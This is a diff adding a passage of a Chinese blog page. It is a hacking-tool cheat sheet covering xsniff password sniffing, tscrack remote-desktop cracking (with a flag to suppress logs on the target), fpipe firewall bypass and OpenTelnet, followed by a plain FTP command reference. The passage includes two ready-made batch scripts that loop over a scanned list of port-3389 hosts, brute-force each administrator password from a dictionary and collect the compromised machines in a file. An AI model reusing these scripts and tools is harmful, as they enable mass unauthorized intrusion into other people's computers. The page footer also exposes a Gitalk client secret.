+</ul>
+
+<h5 id="用法示例-1">用法示例</h5>
+
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">xsniff.exe -pass -hide -log pass.log </code>后台运行嗅探密码并将密码信息保存在pass.log文件中</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">xsniff.exe -tcp -udp -asc -addr 192.168.1.1</code> 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出
+    <h3 id="终端服务密码破解-tscrackexe">终端服务密码破解: tscrack.exe</h3>
+    <h4 id="参数说明-2">参数说明</h4>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-h</code> 显示使用帮助</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-v</code> 显示版本信息
+<code class="language-plaintext highlighter-rouge">-s</code> 在屏幕上打出解密能力</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-b</code> 密码错误时发出的声音
+<code class="language-plaintext highlighter-rouge">-t</code> 同是发出多个连接（多线程）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-N</code> Prevent System Log entries on targeted server</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-U</code> 卸载移除tscrack组件</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-f</code> 使用－f后面的密码</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-F</code> 间隔时间（频率）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-l</code> 使用<code class="language-plaintext highlighter-rouge">－l</code>后面的用户名</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-w</code> 使用<code class="language-plaintext highlighter-rouge">－w</code>后面的密码字典</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-p</code> 使用<code class="language-plaintext highlighter-rouge">－p</code>后面的密码</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">-D</code> 登录主页面
+    <h5 id="用法示例-2">用法示例</h5>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">tscrack 192.168.0.1 -l administrator -w pass.dic</code> 远程用密码字典文件暴破主机的<code class="language-plaintext highlighter-rouge">administrator</code>的登陆密码</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">tscrack 192.168.0.1 -l administrator -p 123456</code> 用密码<code class="language-plaintext highlighter-rouge">123456</code>远程登陆<code class="language-plaintext highlighter-rouge">192.168.0.1</code>的<code class="language-plaintext highlighter-rouge">administrator</code>用户</li>
+</ul>
+
+<pre><code class="language-cmd">　　@if not exist ipcscan.txt goto noscan
+　　@for /f "tokens=1 delims= " %%i in (3389.txt) do call hack.bat %%i
+　　nscan
+　　@echo 3389.txt no find or scan faild
+</code></pre>
+
+<p>(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)
+3389.bat意思是：从3389.txt文件中取一个IP，接着运行<code class="language-plaintext highlighter-rouge">hack.bat</code></p>
+
+<pre><code class="language-cmd">　　@if not exist tscrack.exe goto noscan
+　　@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt
+　　:noscan
+　　@echo tscrack.exe no find or scan faild
+</code></pre>
+
+<p>(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)
+　　hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。</p>
+<h3 id="其它">其它</h3>
+<h4 id="shutdownexe">Shutdown.exe</h4>
+
+<ul>
+  <li>Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">fpipe.exe</code> (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">fpipe -l 80 -s 1029 -r 80</code> 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">Fpipe -l 23 -s 88 -r 23</code> 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。
+    <h4 id="opentelnetexe-远程开启telnet工具">OpenTelnet.exe (远程开启telnet工具)</h4>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口</code> （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。</li>
+  <li>NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。
+    <h5 id="resumetelnetexe-opentelnet附带的另一个工具">ResumeTelnet.exe (OpenTelnet附带的另一个工具)</h5>
+  </li>
+  <li>
+<code class="language-plaintext highlighter-rouge">resumetelnet.exe IP　帐号　密码 </code>用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。</li>
+</ul>
+
+<h5 id="ftp命令详解">FTP命令详解</h5>
+<p>FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。
+FTP的命令行格式为：</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">ftp -v -d -i -n -g [主机名]</code> ，其中</p>
+
+    <p><code class="language-plaintext highlighter-rouge">-v</code> 显示远程服务器的所有响应信息</p>
+
+    <p><code class="language-plaintext highlighter-rouge">-n</code> 限制ftp的自动登录，即不使用.n etrc文件；</p>
+
+    <p><code class="language-plaintext highlighter-rouge">-d</code> 使用调试方式；</p>
+
+    <p><code class="language-plaintext highlighter-rouge">-g</code> 取消全局文件名。
+　　</p>
+  </li>
+</ul>
+
+<p>FTP使用的内部命令如下(中括号表示可选项):</p>
+
+<ol>
+  <li>
+<code class="language-plaintext highlighter-rouge">![cmd[args]]</code>：在本地机中执行交互shell，exit回到ftp环境，如：<code class="language-plaintext highlighter-rouge">!ls*.zip</code>
+</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">$ macro-ame[args]</code>： 执行宏定义macro-name。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">account[password]</code>： 提供登录远程系统成功后访问系统资源所需的补充口令。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">append local-file[remote-file]</code>：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">ascii</code>：使用ascii类型传输方式。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">bell</code>：每个命令执行完毕后计算机响铃一次。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">bin</code>：使用二进制文件传输方式。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">bye</code>：退出ftp会话过程。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">case</code>：在使用mget时，将远程主机文件名中的大写转为小写字母。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">cd</code> remote-dir：进入远程主机目录。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">cdup</code>：进入远程主机目录的父目录。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">chmod mode file-name</code>：将远程主机文件file-name的存取方式设置为mode，如：<code class="language-plaintext highlighter-rouge">chmod 777 a.out</code>。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">close</code>：中断与远程服务器的ftp会话(与open对应)。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">cr</code>：使用asscii方式传输文件时，将回车换行转换为回行。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">delete remote-file</code>：删除远程主机文件。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">debug[debug-value]</code>：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">dir[remote-dir][local-file]</code>：显示远程主机目录，并将结果存入本地文件。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">disconnection</code>：同close。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">form format</code>：将文件传输方式设置为format，缺省为file方式。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">get remote-file[local-file]</code>： 将远程主机的文件remote-file传至本地硬盘的local-file。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">glob</code>：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">hash</code>：每传输1024字节，显示一个hash符号(#)。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">help[cmd]</code>：显示ftp内部命令cmd的帮助信息，如：<code class="language-plaintext highlighter-rouge">help get</code>。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">idle[seconds]</code>：将远程服务器的休眠计时器设为[seconds]秒。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">image</code>：设置二进制传输方式(同binary)。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">lcd[dir]</code>：将本地工作目录切换至dir。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">ls[remote-dir][local-file]</code>：显示远程目录remote-dir， 并存入本地文件local-file。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">macdef macro-name</code>：定义一个宏，遇到macdef下的空行时，宏定义结束。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mdelete[remote-file]</code>：删除远程主机文件。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mdir remote-files local-file</code>：与dir类似，但可指定多个远程文件，如 ：<code class="language-plaintext highlighter-rouge">mdir *.o.*.zipoutfile </code>。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mget remote-files</code>：传输多个远程文件。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mkdir dir-name</code>：在远程主机中建一目录。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mls remote-file local-file</code>：同nlist，但可指定多个文件名。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mode[modename]</code>：将文件传输方式设置为modename， 缺省为stream方式。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">modtime file-name</code>：显示远程主机文件的最后修改时间。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">mput local-file</code>：将多个文件传输至远程主机。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">newer file-name</code>： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">nlist[remote-dir][local-file]</code>：显示远程主机目录的文件清单，并存入本地硬盘的local-file。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">nmap[inpattern outpattern]</code>：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：<code class="language-plaintext highlighter-rouge">nmap $1.$2.$3[$1，$2].[$2，$3]</code>，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">ntrans[inchars[outchars]]</code>：设置文件名字符的翻译机制，如<code class="language-plaintext highlighter-rouge">ntrans 1R</code>，则文件名LLL将变为RRR。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">open host[port]</code>：建立指定ftp服务器连接，可指定连接端口。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">passive</code>：进入被动传输方式。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">prompt</code>：设置多个文件传输时的交互提示。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">proxy ftp-cmd</code>：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">put local-file[remote-file]</code>：将本地文件local-file传送至远程主机。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">pwd</code>：显示远程主机的当前工作目录。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">quit</code>：同bye，退出ftp会话。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">quote arg1，arg2...</code>：将参数逐字发至远程ftp服务器，如：<code class="language-plaintext highlighter-rouge">quote syst</code>.</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">recv remote-file[local-file]</code>：同<code class="language-plaintext highlighter-rouge">get</code>。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">reget remote-file[local-file]</code>：类似于<code class="language-plaintext highlighter-rouge">get</code>， 但若<code class="language-plaintext highlighter-rouge">local-file</code>存在，则从上次传输中断处续传。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">rhelp[cmd-name]</code>：请求获得远程主机的帮助。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">rstatus[file-name]</code> ：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">rename[from][to]</code>：更改远程主机文件名。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">reset</code>：清除回答队列。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">restart marker</code>：从指定的标志marker处，重新开始<code class="language-plaintext highlighter-rouge">get</code>或<code class="language-plaintext highlighter-rouge">put</code>，如：<code class="language-plaintext highlighter-rouge">restart 130</code>。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">rmdir dir-name</code>：删除远程主机目录。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">runique</code>：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">send local-file[remote-file]</code>：同<code class="language-plaintext highlighter-rouge">pu</code>t。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">sendport</code>：设置<code class="language-plaintext highlighter-rouge">PORT</code>命令的使用。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">site arg1，arg2...</code>：将参数作为SITE命令逐字发送至远程ftp主机。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">size file-name</code>：显示远程主机文件大小，如：<code class="language-plaintext highlighter-rouge">site idle 7200</code>。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">status</code>：显示当前ftp状态。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">struct[struct-name]</code>：将文件传输结构设置为<code class="language-plaintext highlighter-rouge">struct-name</code>， 缺省时使用stream结构。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">sunique</code>：将远程主机文件名存储设置为只一(与runique对应)。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">system</code>：显示远程主机的操作系统类型。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">tenex</code>：将文件传输类型设置为TENEX机的所需的类型。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">tick</code>：设置传输时的字节计数器。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">trace</code>：设置包跟踪。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">type[type-name]</code>：设置文件传输类型为<code class="language-plaintext highlighter-rouge">type-name</code>，缺省为<code class="language-plaintext highlighter-rouge">ascii</code>，如:<code class="language-plaintext highlighter-rouge">type binary</code>，设置二进制传输方式。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">umask[newmask]</code>：将远程服务器的缺省 <code class="language-plaintext highlighter-rouge">umask</code>设置为<code class="language-plaintext highlighter-rouge">newmask</code>，如：<code class="language-plaintext highlighter-rouge">umask 3</code>
+</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">user user-name[password][account]</code>：向远程主机表明自己的身份，需要口令时，必须输入口令，如：<code class="language-plaintext highlighter-rouge">user anonymous my@email</code>。</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">verbose</code>：同命令行的<code class="language-plaintext highlighter-rouge">-v</code>参数，即设置详尽报告方式，<code class="language-plaintext highlighter-rouge">ftp</code> 服务器的所有响 应都将显示给用户，缺省为<code class="language-plaintext highlighter-rouge">on</code>.</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">?[cmd]</code>：同<code class="language-plaintext highlighter-rouge">help</code>.</li>
+</ol>
+
+
+                <hr style="visibility: hidden;">
+
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/2019/04/10/markdown_example/" data-toggle="tooltip" data-placement="top" title="markdown 语法">
+                        Next<br>
+                        <span>markdown 语法</span>
+                        </a>
+                    </li>
+                    
+                </ul>
+
+
+                <!--Gitalk评论start  -->
+                
+                <!-- 引入Gitalk评论插件  -->
+                <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+                <script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script>
+                <div id="gitalk-container"></div>
+                <!-- 引入一个生产md5的js，用于对id值进行处理，防止其过长 -->
+                <!-- Thank DF:https://github.com/NSDingFan/NSDingFan.github.io/issues/3#issuecomment-407496538 -->
+                <script src="/js/md5.min.js"></script>
+                <script type="text/javascript">
+                    var gitalk = new Gitalk({
+                    clientID: '0224d5b04da044c201d4',
+                    clientSecret: 'ccd26d0c1d8d4cc3377be7cb388f854ad2b4e5d0',
+                    repo: 'wangpengcheng.github.io',
+                    owner: 'wangpengcheng',
+                    admin: ['wangpengcheng'],
+                    distractionFreeMode: true,
+                    id: md5(location.pathname),
+                    });
+                    gitalk.render('gitalk-container');
+                </script>
+                
+                <!-- Gitalk end -->
+
+                
+
+            </div>  
+
+    <!-- Side Catalog Container -->
+        
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+        
+
+    <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#C++" title="C++" rel="37">
+                                    C++
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#%E5%9F%BA%E7%A1%80%E7%BC%96%E7%A8%8B" title="基础编程" rel="24">
+                                    基础编程
+                                </a>
+                            
+        				
+                            
+                				<a href="/tags/#C/C++" title="C/C++" rel="26">
+                                    C/C++
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#%E5%90%8E%E5%8F%B0%E5%BC%80%E5%8F%91" title="后台开发" rel="12">
+                                    后台开发
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#C" title="C" rel="4">
+                                    C
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B" title="网络编程" rel="8">
+                                    网络编程
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#STL%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90" title="STL源码解析" rel="4">
+                                    STL源码解析
+                                </a>
+                            
+        				
+                            
+                				<a href="/tags/#Linux" title="Linux" rel="18">
+                                    Linux
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F" title="操作系统" rel="12">
+                                    操作系统
+                                </a>
+                            
+        				
+                            
+                				<a href="/tags/#%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1" title="程序设计" rel="14">
+                                    程序设计
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#%E4%BC%98%E5%8C%96" title="优化" rel="4">
+                                    优化
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#UML" title="UML" rel="4">
+                                    UML
+                                </a>
+                            
+        				
+                            
+                				<a href="/tags/#UNIX" title="UNIX" rel="5">
+                                    UNIX
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" title="学习笔记" rel="14">
+                                    学习笔记
+                                </a>
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#%E9%9D%A2%E8%AF%95" title="面试" rel="12">
+                                    面试
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#Java" title="Java" rel="11">
+                                    Java
+                                </a>
+                            
+        				
+                            
+                				<a href="/tags/#%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0" title="读书笔记" rel="6">
+                                    读书笔记
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#%E4%B8%AD%E9%97%B4%E4%BB%B6" title="中间件" rel="5">
+                                    中间件
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#go" title="go" rel="4">
+                                    go
+                                </a>
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" title="阅读笔记" rel="5">
+                                    阅读笔记
+                                </a>
+                            
+        				
+                            
+                				<a href="/tags/#KVM" title="KVM" rel="4">
+                                    KVM
+                                </a>
+                            
+        				
+                            
+                				<a href="/tags/#QEMU" title="QEMU" rel="4">
+                                    QEMU
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#%E8%99%9A%E6%8B%9F%E5%8C%96" title="虚拟化" rel="5">
+                                    虚拟化
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+                            
+        				
+        			</div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+                    
+                        <li><a href="http://zhengwuyang.com">WY</a></li>
+                    
+                        <li><a href="http://www.jianshu.com/u/e71990ada2fd">简书·JF</a></li>
+                    
+                        <li><a href="https://apple.com">Apple</a></li>
+                    
+                        <li><a href="https://developer.apple.com/">Apple Developer</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("//cdnjs.cloudflare.com/ajax/libs/anchor-js/1.1.1/anchor.min.js",function(){
+        // BY Fix:去除标题前的‘#’ issues:<https://github.com/qiubaiying/qiubaiying.github.io/issues/137>
+        // anchors.options = {
+        //   visible: 'always',
+        //   placement: 'right',
+        //   icon: '#'
+        // };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+                    <!-- add jianshu add target = "_blank" to <a> by BY -->
+                    
+                    
+
+                    <!-- add Weibo, Zhihu by Hux, add target = "_blank" to <a> by Hux -->
+                    
+                    
+
+
+                    
+                    <li>
+                        <a target="_blank" href="https://www.facebook.com/wangpengcheng">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/wangpengcheng">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright © My Blog 2024
+                    <br>
+                    Theme on <a href="https://github.com/wangpengcheng/wangpengcheng.github.io.git">GitHub</a> |
+                    <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0" width="100px" height="20px" src="https://ghbtns.com/github-btn.html?user=wangpengcheng&repo=wangpengcheng.github.io&type=star&count=true">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+<!-- Service Worker -->
+
+<script type="text/javascript">
+    if(navigator.serviceWorker){
+        // For security reasons, a service worker can only control the pages that are in the same directory level or below it. That's why we put sw.js at ROOT level.
+        navigator.serviceWorker
+            .register('/sw.js')
+            .then((registration) => {console.log('Service Worker Registered. ', registration)})
+            .catch((error) => {console.log('ServiceWorker registration failed: ', error)})
+    }
+</script>
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/ 
+     - https://github.com/jneen/rouge/wiki/list-of-supported-languages-and-lexers   
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async('/js/jquery.tagcloud.js',function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '4b4b33b70559d548603afcd03258bacb';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+
+
+<!-- Side Catalog -->
+
+<script type="text/javascript">
+    function generateCatalog (selector) {
+        var P = $('div.post-container'),a,n,t,l,i,c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#"+$(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="'+i+'" rel="nofollow">'+t+'</a>');
+            l = $('<li class="'+n+'_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;    
+    }
+
+    generateCatalog(".catalog-body");
+
+    // toggle side catalog
